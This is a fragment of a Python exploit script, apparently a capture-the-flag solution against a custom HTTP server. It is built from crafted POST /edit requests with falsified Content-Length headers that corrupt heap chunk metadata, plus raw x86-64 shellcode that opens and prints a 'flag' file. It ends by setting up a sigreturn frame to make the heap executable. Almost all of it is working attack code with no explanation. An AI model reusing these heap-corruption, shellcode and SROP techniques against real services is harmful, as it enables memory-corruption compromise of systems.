...
add(b'a'*0x4f0) #6
add(b'a'*0x20) #7
tmp=b'a'*0x61+b'a'*0x10+p64(fakechunk)
tmp_length=len(tmp)-3
payload=f'POST /edit HTTP/1.1\r\nIdx:4\r\nConnection:Keep-Alive\r\nAccept-Encoding:gzip\r\nContent-Length:{tmp_length}\r\nHOST:test\r\n\n'.encode()
# payload+=b'a'*0x21+p64(0)+p64(0x451-0x30)+p64(target)*2
payload+=tmp
cmd(payload)

tmp=b'a'*0x62+b'a'*8+p64(target)
tmp_length=len(tmp)-3
payload=f'POST /edit HTTP/1.1\r\nIdx:4\r\nConnection:Keep-Alive\r\nAccept-Encoding:gzip\r\nContent-Length:{tmp_length}\r\nHOST:test\r\n\n'.encode()
# payload+=b'a'*0x21+p64(0)+p64(0x451-0x30)+p64(target)*2
payload+=tmp
...
for i in range(6):
    tmp=b'a'*(0x66-0x8-i)+p64(0x3f1)
    tmp_length=len(tmp)-3-4
    payload=f'POST /edit HTTP/1.1\r\nIdx:4\r\nConnection:Keep-Alive\r\nAccept-Encoding:gzip\r\nContent-Length:{tmp_length}\r\nHOST:test\r\n\n'.encode()
    # payload+=b'a'*0x21+p64(0)+p64(0x451-0x30)+p64(target)*2
    payload+=tmp
    cmd(payload)
for i in range(9):
    edit(5,b'a'*(0xf8-i))
# edit(5,b'a'*0xf1+p64(0x420)[:-6])

tmp=b'a'*0xf1+p64(0x3f0)[:-6]
tmp_length=len(tmp)-1
payload=f'POST /edit HTTP/1.1\r\nIdx:5\r\nConnection:Keep-Alive\r\nAccept-Encoding:gzip\r\nContent-Length:{tmp_length}\r\nHOST:test\r\n\n'.encode()
# payload+=b'a'*0x21+p64(0)+p64(0x451-0x30)+p64(target)*2
payload+=tmp
...
shellcode=b'hflagH\x89\xe61\xff1\xd21\xc0f\xb8\x01\x01\x0f\x05H\x89\xc71\xc0j`ZH\x89\xe6\x0f\x05j\x01_j`ZH\x89\xe6j\x01X\x0f\x05'
sig=SigreturnFrame()
sig.rdi=heapbase
sig.rsi=0x3000
sig.rdx=7
